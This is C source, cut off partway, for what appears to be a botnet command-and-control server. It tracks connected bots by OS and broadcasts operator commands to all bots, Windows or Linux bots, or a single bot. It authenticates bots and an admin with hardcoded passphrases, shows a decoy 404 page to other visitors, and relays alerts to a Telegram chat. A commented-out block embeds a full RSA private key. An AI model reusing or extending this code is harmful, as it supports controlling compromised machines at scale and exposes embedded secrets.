#include <openssl/pem.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <curl/curl.h>
#include <ctype.h>
#include <signal.h>
#define DEBUG
#define MAXCONNECTIONS 5000
typedef unsigned int SOCKET;
typedef struct bot{
    char name[30];
    SOCKET client;
    unsigned int localid;
    struct sockaddr_in addr;
    time_t init_date;
    int logged;
    int SO; //1 linux, 2 windows
    char pwd[16];
}*BOT;

_Atomic static short int SERVERSTATUS = 0;
static _Atomic unsigned int cli_count = 0;
/*
unsigned char private_pem[] = {
  0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x52,
  0x53, 0x41, 0x20, 0x50, 0x52, 0x49, 0x56, 0x41, 0x54, 0x45, 0x20, 0x4b,
  0x45, 0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x45,
  0x70, 0x51, 0x49, 0x42, 0x41, 0x41, 0x4b, 0x43, 0x41, 0x51, 0x45, 0x41,
  0x72, 0x6e, 0x76, 0x55, 0x42, 0x7a, 0x36, 0x4c, 0x52, 0x45, 0x51, 0x39,
  0x4d, 0x6c, 0x32, 0x74, 0x72, 0x66, 0x63, 0x53, 0x7a, 0x53, 0x39, 0x4e,
  0x75, 0x42, 0x7a, 0x4e, 0x49, 0x46, 0x64, 0x44, 0x4c, 0x64, 0x53, 0x4e,
  0x64, 0x72, 0x6d, 0x31, 0x71, 0x51, 0x64, 0x35, 0x79, 0x69, 0x41, 0x4d,
  0x0a, 0x58, 0x70, 0x56, 0x2b, 0x78, 0x58, 0x76, 0x54, 0x67, 0x59, 0x66,
  0x34, 0x73, 0x4b, 0x46, 0x38, 0x4d, 0x6d, 0x6b, 0x39, 0x38, 0x4d, 0x52,
  0x32, 0x5a, 0x6a, 0x70, 0x34, 0x49, 0x47, 0x73, 0x63, 0x58, 0x61, 0x77,
  0x78, 0x30, 0x30, 0x6d, 0x6d, 0x6d, 0x65, 0x39, 0x75, 0x45, 0x45, 0x41,
  0x70, 0x35, 0x69, 0x46, 0x4b, 0x74, 0x69, 0x39, 0x66, 0x38, 0x47, 0x51,
  0x78, 0x4d, 0x44, 0x70, 0x4b, 0x0a, 0x58, 0x74, 0x6c, 0x33, 0x34, 0x65,
  0x34, 0x67, 0x78, 0x4f, 0x74, 0x48, 0x6d, 0x58, 0x5a, 0x73, 0x74, 0x69,
  0x66, 0x4d, 0x41, 0x61, 0x57, 0x4b, 0x68, 0x2f, 0x47, 0x67, 0x51, 0x48,
  0x47, 0x2b, 0x62, 0x53, 0x51, 0x56, 0x70, 0x48, 0x38, 0x56, 0x74, 0x6c,
  0x71, 0x4d, 0x72, 0x39, 0x6c, 0x76, 0x42, 0x67, 0x55, 0x71, 0x51, 0x76,
  0x59, 0x33, 0x67, 0x6d, 0x4d, 0x54, 0x6e, 0x52, 0x73, 0x48, 0x0a, 0x41,
  0x6f, 0x52, 0x35, 0x67, 0x7a, 0x56, 0x71, 0x50, 0x6f, 0x52, 0x62, 0x4e,
  0x78, 0x36, 0x62, 0x53, 0x32, 0x58, 0x47, 0x6f, 0x6b, 0x59, 0x6c, 0x39,
  0x66, 0x59, 0x68, 0x32, 0x64, 0x52, 0x56, 0x77, 0x48, 0x48, 0x59, 0x31,
  0x6c, 0x2b, 0x31, 0x73, 0x75, 0x71, 0x72, 0x4a, 0x59, 0x4e, 0x38, 0x4a,
  0x65, 0x59, 0x6a, 0x72, 0x57, 0x56, 0x6b, 0x37, 0x4b, 0x38, 0x74, 0x78,
  0x69, 0x51, 0x37, 0x0a, 0x67, 0x66, 0x36, 0x37, 0x33, 0x59, 0x50, 0x4b,
  0x59, 0x54, 0x63, 0x53, 0x4e, 0x51, 0x75, 0x47, 0x43, 0x68, 0x6b, 0x47,
  0x6c, 0x41, 0x50, 0x59, 0x58, 0x63, 0x50, 0x62, 0x53, 0x37, 0x49, 0x6e,
  0x47, 0x61, 0x41, 0x7a, 0x44, 0x74, 0x62, 0x4a, 0x48, 0x59, 0x56, 0x5a,
  0x45, 0x62, 0x36, 0x53, 0x35, 0x57, 0x32, 0x58, 0x66, 0x75, 0x37, 0x48,
  0x52, 0x38, 0x50, 0x46, 0x2f, 0x54, 0x61, 0x7a, 0x0a, 0x32, 0x31, 0x59,
  0x47, 0x72, 0x52, 0x72, 0x70, 0x47, 0x2f, 0x41, 0x69, 0x32, 0x38, 0x44,
  0x48, 0x54, 0x65, 0x69, 0x6b, 0x5a, 0x53, 0x45, 0x76, 0x4e, 0x76, 0x6b,
  0x2f, 0x4c, 0x56, 0x6d, 0x43, 0x76, 0x6b, 0x61, 0x32, 0x43, 0x51, 0x49,
  0x44, 0x41, 0x51, 0x41, 0x42, 0x41, 0x6f, 0x49, 0x42, 0x41, 0x51, 0x43,
  0x41, 0x34, 0x4a, 0x66, 0x49, 0x7a, 0x67, 0x71, 0x68, 0x33, 0x75, 0x46,
  0x77, 0x0a, 0x7a, 0x54, 0x37, 0x57, 0x79, 0x7a, 0x4e, 0x49, 0x2b, 0x52,
  0x4b, 0x6e, 0x31, 0x69, 0x59, 0x78, 0x4b, 0x43, 0x4e, 0x48, 0x75, 0x38,
  0x4c, 0x4e, 0x6d, 0x66, 0x67, 0x7a, 0x4a, 0x49, 0x46, 0x78, 0x71, 0x57,
  0x42, 0x5a, 0x6b, 0x49, 0x52, 0x31, 0x71, 0x37, 0x4f, 0x61, 0x37, 0x6d,
  0x72, 0x6a, 0x56, 0x44, 0x50, 0x66, 0x4c, 0x46, 0x73, 0x43, 0x39, 0x71,
  0x6f, 0x5a, 0x63, 0x6b, 0x42, 0x2b, 0x0a, 0x65, 0x58, 0x38, 0x58, 0x4e,
  0x58, 0x51, 0x4d, 0x41, 0x30, 0x2b, 0x61, 0x54, 0x66, 0x35, 0x32, 0x35,
  0x46, 0x33, 0x4f, 0x54, 0x48, 0x4c, 0x5a, 0x78, 0x48, 0x35, 0x52, 0x6d,
  0x6a, 0x2b, 0x32, 0x78, 0x71, 0x64, 0x65, 0x44, 0x62, 0x54, 0x39, 0x33,
  0x52, 0x79, 0x35, 0x4e, 0x71, 0x76, 0x4a, 0x44, 0x32, 0x37, 0x57, 0x30,
  0x4f, 0x68, 0x66, 0x6f, 0x76, 0x32, 0x43, 0x30, 0x68, 0x63, 0x79, 0x0a,
  0x34, 0x70, 0x44, 0x73, 0x48, 0x6f, 0x59, 0x5a, 0x33, 0x59, 0x43, 0x56,
  0x45, 0x36, 0x62, 0x73, 0x30, 0x47, 0x61, 0x77, 0x42, 0x4b, 0x71, 0x6c,
  0x6b, 0x53, 0x57, 0x4a, 0x47, 0x52, 0x73, 0x49, 0x74, 0x53, 0x50, 0x6c,
  0x69, 0x6e, 0x66, 0x41, 0x5a, 0x6a, 0x76, 0x36, 0x56, 0x66, 0x6f, 0x6a,
  0x34, 0x39, 0x4a, 0x4a, 0x4d, 0x4a, 0x4b, 0x62, 0x71, 0x63, 0x42, 0x46,
  0x68, 0x72, 0x6c, 0x2f, 0x0a, 0x78, 0x38, 0x46, 0x58, 0x30, 0x73, 0x51,
  0x31, 0x32, 0x54, 0x51, 0x71, 0x4b, 0x6b, 0x35, 0x5a, 0x44, 0x64, 0x30,
  0x79, 0x44, 0x45, 0x69, 0x70, 0x59, 0x38, 0x6b, 0x34, 0x71, 0x64, 0x72,
  0x76, 0x2f, 0x5a, 0x70, 0x4c, 0x39, 0x4c, 0x59, 0x76, 0x46, 0x65, 0x62,
  0x6b, 0x70, 0x6e, 0x31, 0x4e, 0x59, 0x67, 0x54, 0x69, 0x49, 0x4e, 0x4d,
  0x33, 0x43, 0x32, 0x32, 0x71, 0x6f, 0x31, 0x4a, 0x6d, 0x0a, 0x47, 0x62,
  0x77, 0x33, 0x6d, 0x42, 0x32, 0x54, 0x6b, 0x39, 0x77, 0x56, 0x67, 0x30,
  0x38, 0x77, 0x68, 0x38, 0x67, 0x2b, 0x51, 0x57, 0x59, 0x67, 0x38, 0x42,
  0x4c, 0x6c, 0x6d, 0x37, 0x66, 0x34, 0x59, 0x74, 0x7a, 0x31, 0x53, 0x47,
  0x55, 0x5a, 0x59, 0x77, 0x56, 0x68, 0x74, 0x51, 0x31, 0x6a, 0x62, 0x53,
  0x44, 0x70, 0x45, 0x4c, 0x32, 0x2f, 0x53, 0x58, 0x6b, 0x54, 0x65, 0x36,
  0x42, 0x4a, 0x0a, 0x43, 0x2f, 0x4c, 0x4c, 0x4b, 0x51, 0x30, 0x64, 0x41,
  0x6f, 0x47, 0x42, 0x41, 0x4e, 0x5a, 0x32, 0x4c, 0x54, 0x54, 0x54, 0x65,
  0x56, 0x33, 0x31, 0x66, 0x59, 0x37, 0x4d, 0x65, 0x70, 0x76, 0x42, 0x70,
  0x5a, 0x37, 0x45, 0x4c, 0x52, 0x7a, 0x57, 0x6f, 0x39, 0x73, 0x56, 0x77,
  0x48, 0x50, 0x32, 0x4d, 0x67, 0x54, 0x57, 0x75, 0x6a, 0x74, 0x33, 0x59,
  0x54, 0x62, 0x77, 0x70, 0x46, 0x64, 0x36, 0x0a, 0x59, 0x68, 0x66, 0x56,
  0x64, 0x30, 0x45, 0x71, 0x4d, 0x65, 0x6f, 0x61, 0x62, 0x65, 0x4b, 0x41,
  0x4a, 0x79, 0x78, 0x58, 0x78, 0x76, 0x56, 0x35, 0x62, 0x46, 0x4c, 0x5a,
  0x4d, 0x6a, 0x33, 0x48, 0x32, 0x74, 0x42, 0x59, 0x79, 0x4c, 0x78, 0x7a,
  0x41, 0x49, 0x72, 0x45, 0x2f, 0x6d, 0x66, 0x4a, 0x36, 0x6f, 0x74, 0x4f,
  0x2f, 0x4d, 0x37, 0x2b, 0x55, 0x34, 0x45, 0x4f, 0x65, 0x37, 0x44, 0x36,
  0x0a, 0x38, 0x36, 0x6e, 0x35, 0x30, 0x4d, 0x4a, 0x6b, 0x75, 0x51, 0x52,
  0x62, 0x37, 0x75, 0x5a, 0x73, 0x46, 0x72, 0x45, 0x73, 0x71, 0x6f, 0x5a,
  0x6e, 0x77, 0x39, 0x37, 0x59, 0x6d, 0x63, 0x72, 0x51, 0x33, 0x48, 0x33,
  0x50, 0x4f, 0x38, 0x36, 0x76, 0x71, 0x58, 0x58, 0x78, 0x76, 0x6c, 0x49,
  0x7a, 0x2b, 0x33, 0x78, 0x70, 0x79, 0x6d, 0x35, 0x62, 0x41, 0x6f, 0x47,
  0x42, 0x41, 0x4e, 0x42, 0x48, 0x0a, 0x5a, 0x4f, 0x53, 0x38, 0x79, 0x30,
  0x2b, 0x65, 0x6c, 0x71, 0x75, 0x41, 0x6c, 0x4f, 0x67, 0x66, 0x62, 0x7a,
  0x44, 0x7a, 0x39, 0x58, 0x45, 0x37, 0x32, 0x54, 0x72, 0x4d, 0x48, 0x6d,
  0x54, 0x57, 0x4b, 0x77, 0x39, 0x58, 0x32, 0x74, 0x4e, 0x49, 0x73, 0x33,
  0x44, 0x5a, 0x49, 0x38, 0x44, 0x55, 0x35, 0x48, 0x7a, 0x2b, 0x2f, 0x4f,
  0x4d, 0x37, 0x78, 0x46, 0x37, 0x68, 0x50, 0x4b, 0x68, 0x37, 0x0a, 0x33,
  0x72, 0x35, 0x38, 0x62, 0x42, 0x45, 0x62, 0x6e, 0x4d, 0x6a, 0x63, 0x4d,
  0x44, 0x2b, 0x68, 0x56, 0x55, 0x58, 0x67, 0x6c, 0x57, 0x33, 0x79, 0x31,
  0x30, 0x6e, 0x63, 0x33, 0x46, 0x57, 0x56, 0x47, 0x6d, 0x69, 0x6d, 0x62,
  0x52, 0x71, 0x47, 0x50, 0x4e, 0x52, 0x36, 0x44, 0x78, 0x41, 0x68, 0x59,
  0x41, 0x4a, 0x74, 0x4d, 0x73, 0x76, 0x51, 0x59, 0x77, 0x72, 0x58, 0x55,
  0x63, 0x75, 0x45, 0x0a, 0x68, 0x67, 0x43, 0x6a, 0x34, 0x6f, 0x50, 0x6c,
  0x42, 0x6e, 0x34, 0x48, 0x6b, 0x49, 0x41, 0x2b, 0x50, 0x59, 0x48, 0x6e,
  0x2b, 0x49, 0x6b, 0x47, 0x6a, 0x4c, 0x59, 0x35, 0x65, 0x46, 0x75, 0x6e,
  0x51, 0x79, 0x44, 0x59, 0x6a, 0x36, 0x4a, 0x72, 0x41, 0x6f, 0x47, 0x41,
  0x44, 0x51, 0x62, 0x2b, 0x74, 0x66, 0x2f, 0x47, 0x6c, 0x70, 0x4f, 0x4c,
  0x2f, 0x66, 0x6d, 0x6a, 0x31, 0x51, 0x52, 0x4e, 0x0a, 0x57, 0x44, 0x69,
  0x59, 0x65, 0x50, 0x44, 0x38, 0x34, 0x52, 0x6b, 0x51, 0x4b, 0x4c, 0x73,
  0x69, 0x7a, 0x4c, 0x4a, 0x79, 0x65, 0x35, 0x78, 0x44, 0x31, 0x6e, 0x2b,
  0x46, 0x72, 0x42, 0x36, 0x75, 0x43, 0x4c, 0x36, 0x5a, 0x30, 0x4f, 0x61,
  0x4d, 0x51, 0x36, 0x6b, 0x35, 0x56, 0x5a, 0x48, 0x74, 0x54, 0x7a, 0x39,
  0x42, 0x77, 0x62, 0x57, 0x50, 0x67, 0x2f, 0x54, 0x58, 0x6e, 0x58, 0x4d,
  0x66, 0x0a, 0x63, 0x70, 0x71, 0x43, 0x44, 0x78, 0x68, 0x35, 0x52, 0x76,
  0x53, 0x79, 0x63, 0x34, 0x47, 0x4c, 0x63, 0x73, 0x7a, 0x6f, 0x68, 0x48,
  0x5a, 0x6b, 0x67, 0x69, 0x6c, 0x73, 0x45, 0x42, 0x4d, 0x65, 0x62, 0x41,
  0x76, 0x56, 0x78, 0x34, 0x6b, 0x77, 0x78, 0x2f, 0x67, 0x42, 0x71, 0x68,
  0x4f, 0x55, 0x79, 0x55, 0x78, 0x71, 0x53, 0x32, 0x48, 0x51, 0x50, 0x79,
  0x41, 0x76, 0x4c, 0x32, 0x66, 0x43, 0x0a, 0x6a, 0x51, 0x33, 0x69, 0x6c,
  0x79, 0x71, 0x4b, 0x67, 0x37, 0x53, 0x63, 0x6d, 0x41, 0x65, 0x36, 0x56,
  0x68, 0x4e, 0x6a, 0x44, 0x5a, 0x4d, 0x43, 0x67, 0x59, 0x45, 0x41, 0x69,
  0x61, 0x6d, 0x32, 0x75, 0x53, 0x31, 0x45, 0x49, 0x47, 0x4d, 0x4d, 0x36,
  0x56, 0x78, 0x36, 0x6a, 0x35, 0x59, 0x2f, 0x55, 0x78, 0x62, 0x63, 0x63,
  0x72, 0x53, 0x42, 0x46, 0x30, 0x6a, 0x56, 0x43, 0x67, 0x63, 0x34, 0x0a,
  0x76, 0x4e, 0x4a, 0x76, 0x30, 0x31, 0x6a, 0x70, 0x4b, 0x62, 0x79, 0x4c,
  0x30, 0x69, 0x65, 0x6b, 0x77, 0x69, 0x31, 0x7a, 0x6a, 0x75, 0x6e, 0x78,
  0x47, 0x46, 0x6b, 0x39, 0x55, 0x34, 0x74, 0x55, 0x4a, 0x59, 0x6c, 0x74,
  0x6b, 0x44, 0x30, 0x30, 0x2b, 0x74, 0x6e, 0x32, 0x6c, 0x67, 0x67, 0x58,
  0x71, 0x62, 0x45, 0x51, 0x63, 0x33, 0x53, 0x66, 0x38, 0x62, 0x55, 0x6d,
  0x65, 0x50, 0x61, 0x74, 0x0a, 0x56, 0x75, 0x41, 0x78, 0x6d, 0x75, 0x65,
  0x42, 0x43, 0x31, 0x75, 0x46, 0x32, 0x7a, 0x36, 0x45, 0x43, 0x2f, 0x61,
  0x4c, 0x4c, 0x59, 0x57, 0x57, 0x41, 0x52, 0x4e, 0x69, 0x66, 0x2b, 0x63,
  0x65, 0x2f, 0x77, 0x74, 0x54, 0x61, 0x36, 0x51, 0x55, 0x44, 0x33, 0x63,
  0x47, 0x66, 0x6f, 0x30, 0x6b, 0x38, 0x46, 0x6b, 0x58, 0x76, 0x39, 0x48,
  0x78, 0x62, 0x58, 0x77, 0x38, 0x33, 0x69, 0x2b, 0x47, 0x0a, 0x77, 0x67,
  0x34, 0x42, 0x6d, 0x66, 0x4d, 0x43, 0x67, 0x59, 0x45, 0x41, 0x73, 0x48,
  0x62, 0x70, 0x41, 0x4c, 0x43, 0x73, 0x4e, 0x62, 0x53, 0x38, 0x54, 0x57,
  0x53, 0x39, 0x69, 0x67, 0x4a, 0x55, 0x43, 0x56, 0x74, 0x78, 0x30, 0x66,
  0x50, 0x47, 0x5a, 0x56, 0x56, 0x4f, 0x52, 0x49, 0x68, 0x6a, 0x69, 0x54,
  0x4c, 0x4a, 0x43, 0x4f, 0x31, 0x4d, 0x37, 0x75, 0x7a, 0x45, 0x70, 0x71,
  0x6c, 0x53, 0x0a, 0x61, 0x64, 0x37, 0x44, 0x36, 0x5a, 0x77, 0x47, 0x36,
  0x75, 0x5a, 0x66, 0x77, 0x30, 0x34, 0x6a, 0x54, 0x50, 0x65, 0x2b, 0x36,
  0x4f, 0x4c, 0x46, 0x76, 0x7a, 0x49, 0x4c, 0x70, 0x56, 0x48, 0x47, 0x52,
  0x6f, 0x67, 0x4b, 0x46, 0x5a, 0x6e, 0x30, 0x63, 0x6c, 0x55, 0x69, 0x4b,
  0x32, 0x66, 0x44, 0x48, 0x42, 0x53, 0x45, 0x63, 0x58, 0x4d, 0x48, 0x69,
  0x41, 0x54, 0x4d, 0x74, 0x42, 0x6d, 0x50, 0x0a, 0x50, 0x43, 0x48, 0x54,
  0x46, 0x56, 0x70, 0x54, 0x79, 0x77, 0x75, 0x6c, 0x6f, 0x35, 0x75, 0x77,
  0x4d, 0x53, 0x6e, 0x55, 0x4e, 0x68, 0x49, 0x47, 0x4f, 0x57, 0x33, 0x4a,
  0x75, 0x59, 0x52, 0x66, 0x49, 0x33, 0x38, 0x73, 0x6a, 0x6e, 0x65, 0x71,
  0x6a, 0x36, 0x42, 0x6f, 0x73, 0x42, 0x76, 0x33, 0x4b, 0x6a, 0x31, 0x30,
  0x34, 0x37, 0x49, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
  0x44, 0x20, 0x52, 0x53, 0x41, 0x20, 0x50, 0x52, 0x49, 0x56, 0x41, 0x54,
  0x45, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
};
unsigned char public_pem[] = {
  0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
  0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
  0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x42, 0x49, 0x6a, 0x41, 0x4e, 0x42,
  0x67, 0x6b, 0x71, 0x68, 0x6b, 0x69, 0x47, 0x39, 0x77, 0x30, 0x42, 0x41,
  0x51, 0x45, 0x46, 0x41, 0x41, 0x4f, 0x43, 0x41, 0x51, 0x38, 0x41, 0x4d,
  0x49, 0x49, 0x42, 0x43, 0x67, 0x4b, 0x43, 0x41, 0x51, 0x45, 0x41, 0x72,
  0x6e, 0x76, 0x55, 0x42, 0x7a, 0x36, 0x4c, 0x52, 0x45, 0x51, 0x39, 0x4d,
  0x6c, 0x32, 0x74, 0x72, 0x66, 0x63, 0x53, 0x0a, 0x7a, 0x53, 0x39, 0x4e,
  0x75, 0x42, 0x7a, 0x4e, 0x49, 0x46, 0x64, 0x44, 0x4c, 0x64, 0x53, 0x4e,
  0x64, 0x72, 0x6d, 0x31, 0x71, 0x51, 0x64, 0x35, 0x79, 0x69, 0x41, 0x4d,
  0x58, 0x70, 0x56, 0x2b, 0x78, 0x58, 0x76, 0x54, 0x67, 0x59, 0x66, 0x34,
  0x73, 0x4b, 0x46, 0x38, 0x4d, 0x6d, 0x6b, 0x39, 0x38, 0x4d, 0x52, 0x32,
  0x5a, 0x6a, 0x70, 0x34, 0x49, 0x47, 0x73, 0x63, 0x58, 0x61, 0x77, 0x78,
  0x0a, 0x30, 0x30, 0x6d, 0x6d, 0x6d, 0x65, 0x39, 0x75, 0x45, 0x45, 0x41,
  0x70, 0x35, 0x69, 0x46, 0x4b, 0x74, 0x69, 0x39, 0x66, 0x38, 0x47, 0x51,
  0x78, 0x4d, 0x44, 0x70, 0x4b, 0x58, 0x74, 0x6c, 0x33, 0x34, 0x65, 0x34,
  0x67, 0x78, 0x4f, 0x74, 0x48, 0x6d, 0x58, 0x5a, 0x73, 0x74, 0x69, 0x66,
  0x4d, 0x41, 0x61, 0x57, 0x4b, 0x68, 0x2f, 0x47, 0x67, 0x51, 0x48, 0x47,
  0x2b, 0x62, 0x53, 0x51, 0x56, 0x0a, 0x70, 0x48, 0x38, 0x56, 0x74, 0x6c,
  0x71, 0x4d, 0x72, 0x39, 0x6c, 0x76, 0x42, 0x67, 0x55, 0x71, 0x51, 0x76,
  0x59, 0x33, 0x67, 0x6d, 0x4d, 0x54, 0x6e, 0x52, 0x73, 0x48, 0x41, 0x6f,
  0x52, 0x35, 0x67, 0x7a, 0x56, 0x71, 0x50, 0x6f, 0x52, 0x62, 0x4e, 0x78,
  0x36, 0x62, 0x53, 0x32, 0x58, 0x47, 0x6f, 0x6b, 0x59, 0x6c, 0x39, 0x66,
  0x59, 0x68, 0x32, 0x64, 0x52, 0x56, 0x77, 0x48, 0x48, 0x59, 0x0a, 0x31,
  0x6c, 0x2b, 0x31, 0x73, 0x75, 0x71, 0x72, 0x4a, 0x59, 0x4e, 0x38, 0x4a,
  0x65, 0x59, 0x6a, 0x72, 0x57, 0x56, 0x6b, 0x37, 0x4b, 0x38, 0x74, 0x78,
  0x69, 0x51, 0x37, 0x67, 0x66, 0x36, 0x37, 0x33, 0x59, 0x50, 0x4b, 0x59,
  0x54, 0x63, 0x53, 0x4e, 0x51, 0x75, 0x47, 0x43, 0x68, 0x6b, 0x47, 0x6c,
  0x41, 0x50, 0x59, 0x58, 0x63, 0x50, 0x62, 0x53, 0x37, 0x49, 0x6e, 0x47,
  0x61, 0x41, 0x7a, 0x0a, 0x44, 0x74, 0x62, 0x4a, 0x48, 0x59, 0x56, 0x5a,
  0x45, 0x62, 0x36, 0x53, 0x35, 0x57, 0x32, 0x58, 0x66, 0x75, 0x37, 0x48,
  0x52, 0x38, 0x50, 0x46, 0x2f, 0x54, 0x61, 0x7a, 0x32, 0x31, 0x59, 0x47,
  0x72, 0x52, 0x72, 0x70, 0x47, 0x2f, 0x41, 0x69, 0x32, 0x38, 0x44, 0x48,
  0x54, 0x65, 0x69, 0x6b, 0x5a, 0x53, 0x45, 0x76, 0x4e, 0x76, 0x6b, 0x2f,
  0x4c, 0x56, 0x6d, 0x43, 0x76, 0x6b, 0x61, 0x32, 0x0a, 0x43, 0x51, 0x49,
  0x44, 0x41, 0x51, 0x41, 0x42, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45,
  0x4e, 0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45,
  0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
};
*/
BOT c_Bots[MAXCONNECTIONS];
pthread_mutex_t cmutex=PTHREAD_MUTEX_INITIALIZER;
/*
  time_t t = time(NULL);
  struct tm tm = *localtime(&t);
*/
int isnumeric(char str[]){
  int ok = 1;
  for(register int i = 0; i < strlen(str);++i){
    if(!isdigit(str[i]))
      ok = 0;
  }
  return ok;
}
int bot_rename(int id, char new_name[]){
  if(strlen(new_name)<=0 && strlen(new_name) >29)
    goto back;
  pthread_mutex_lock(&cmutex);
  if(c_Bots[id])
    strcpy(c_Bots[id]->name,new_name);
  pthread_mutex_unlock(&cmutex);
  goto back;
  back:
    return 0;
}
int sendall(SOCKET c,char msg[]){
  int l = strlen(msg);
  if(l <=0)
    return -1;
  char *ptr = (char *)msg;
  int i = 0;
  while (l > 0){
    if((i=send(c,ptr,l,0)) <= 0) return -1;
    ptr+=i;
    l-=i;
  }
  return 1;
}
int sndmsg(char type[],char msg[]){ //retorna o tanto de bots que foi enviado a mensagem.
  pthread_mutex_lock(&cmutex);
  int mandado = 0;
  if(!strncmp(type,"all",3)){
    for(register int i = 0,z=0; i <MAXCONNECTIONS && z < cli_count;++i){
      if(c_Bots[i] && c_Bots[i]->logged ==1){
        ++z;
        if(strlen(msg) > 1024)
          sendall(c_Bots[i]->client,msg);
        else
          send(c_Bots[i]->client,msg,strlen(msg),0);
        ++mandado;
      }
    }
  }else if(!strncmp(type,"windows",7)){
    for(register int i = 0,z=0; i <MAXCONNECTIONS && z < cli_count;++i){
      if(c_Bots[i]){
        ++z;
        if(c_Bots[i]->SO == 2){
          if(strlen(msg) > 1024)
            sendall(c_Bots[i]->client,msg);
          else
            send(c_Bots[i]->client,msg,strlen(msg),0);
          ++mandado;
        }
      }
    }
  }else if(!strncmp(type,"linux",7)){
    for(register int i = 0,z=0; i <MAXCONNECTIONS && z < cli_count;++i){
      if(c_Bots[i]){
        ++z;
        if(c_Bots[i]->SO == 1){
          if(strlen(msg) > 1024)
            sendall(c_Bots[i]->client,msg);
          else
            send(c_Bots[i]->client,msg,strlen(msg),0);
          ++mandado;
        }
      }
    }
  }else if(isnumeric(type)){
    if(c_Bots[atoi(type)]){
      if(strlen(msg) > 1024)
        sendall(c_Bots[atoi(type)]->client,msg);
      else
        send(c_Bots[atoi(type)]->client,msg,strlen(msg),0);
      ++mandado;
    }
  }
  pthread_mutex_unlock(&cmutex);
  return mandado;
}

void listbots(BOT b,int id){
  pthread_mutex_lock(&cmutex);
  char a[100]={};
  register int nn = 0;
  if(id > -1){
    if(c_Bots[id]){
      sprintf(a,"%s | %s | ID %d | %s\n",c_Bots[id]->logged == 2? "ADMIN":"BOT",inet_ntoa(c_Bots[id]->addr.sin_addr),c_Bots[id]->localid,b->SO == 1? "linux" : "windows");
      if(sendall(c_Bots[id]->client,a) < 0) goto saida;
      ++nn;
      memset(a,0,sizeof(a));
    }
  }
  for(register int i = 0,z=0; i < MAXCONNECTIONS && z <cli_count; ++i){
    if(c_Bots[i]){
      ++z;
      if(c_Bots[i]->localid == b->localid){
        sprintf(a,"%s | %s | ID %d | %s\n",c_Bots[id]->logged == 2? "ADMIN":"BOT",inet_ntoa(b->addr.sin_addr),b->localid,b->SO == 1? "linux" : "windows");
        if(sendall(b->client,a) < 0)  goto saida;
        ++nn;
        memset(a,0,sizeof(a));
      }
    }
  }
  sprintf(a,"%d Bots conectados\n%d Bots enviados\n",cli_count,nn);
  send(b->client,a,strlen(a),0);
  goto saida;
  saida:
    pthread_mutex_unlock(&cmutex);
    return;
}
void addbot(BOT b){
  pthread_mutex_lock(&cmutex);
  for(register int i = 0; i < MAXCONNECTIONS; ++i){
    if(!c_Bots[i]){
      b->localid = i;
      c_Bots[i] = b;
      ++cli_count;
      break;
    }
  }
  pthread_mutex_unlock(&cmutex);
  return;
}
void removebot(BOT b){
    pthread_mutex_lock(&cmutex);
    printf("SAINDO %s\n",inet_ntoa(b->addr.sin_addr));
    c_Bots[b->localid] =NULL;
    close(b->client);
    free(b);
    --cli_count;
    pthread_mutex_unlock(&cmutex);
}
int getpassd(char req[],BOT b){
  char chaves[]=
  "ZeZU6EeLwZKQ5D8UKeop9WPtA34\n" //linux
  "ai8ZckyPaNtdf7qQSMfPL8J8BEL\n" // windows
  "z7s4FhHTGJCezxhSidkPCnrMBZukvTL6s7SQkmfF4Q5P64gWx6koMBzTAw9\n"; //adm
  char *ttt = strtok(chaves,"\n");
  while(ttt!=NULL){
    if(strstr(req,ttt) !=NULL){
      if(!strncmp(req,"z7s4FhHTGJCezxhSidkPCnrMBZukvTL6s7SQkmfF4Q5P64gWx6koMBzTAw9",59)){
        b->SO = 3;
        return 2;
      }else if(!strncmp(req,"ai8ZckyPaNtdf7qQSMfPL8J8BEL",27))
        b->SO=2;
      else
        b->SO = 1;
      return 1;
    }
    ttt=strtok(NULL,"\n");
  }
  return 0;
}
int send_telegram(char msg[]){
  if(strlen(msg) > 0 && strlen(msg) < 1000){
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if(!curl)
      goto end;
    char *b1 = curl_easy_escape(curl,msg,strlen(msg));
    char sender[1024];
    sprintf(sender,"https://api.telegram.org/bot<APITOKEN>/sendMessage?chat_id=1259776308&text=%s",b1);
    curl_easy_setopt(curl,CURLOPT_POSTFIELDS,sender);
    curl_easy_setopt(curl,CURLOPT_POSTFIELDSIZE,(long)strlen(sender));
    curl_easy_setopt(curl,CURLOPT_HTTPGET,1L);
    curl_easy_setopt(curl,CURLOPT_URL,sender);
    curl_easy_setopt(curl,CURLOPT_VERBOSE,0L);
    CURLcode res = curl_easy_perform(curl);
    goto end;
    end:
      curl_free(b1);
      curl_easy_cleanup(curl);
      curl_global_cleanup();
      memset(sender,0,sizeof(sender));
  }
}
void killserver(){
  exit(0);
}
void *handle_connection(void *args){
    char buffer[1024] = {};
    BOT b = (BOT)args;
    printf("CONECTADO %s\n",inet_ntoa(b->addr.sin_addr));
    if(recv(b->client,buffer,sizeof(buffer),0)<0)
      goto saida;
    b->logged = getpassd(buffer,b);
    if(!b->logged){
      char http404[] = "HTTP/1.1 404 Not Found\r\nContent-Type: text/html; charset-UTF-8\r\nReferrer-Policy: no-referrer\r\nContent-Lenght: 18\r\n\r\n<h1>NOT FOUND</h1>";
      send(b->client,http404,strlen(http404),0);
      goto saida;
    }
    memset(buffer,0,sizeof(buffer));
    if(b->logged == 2){
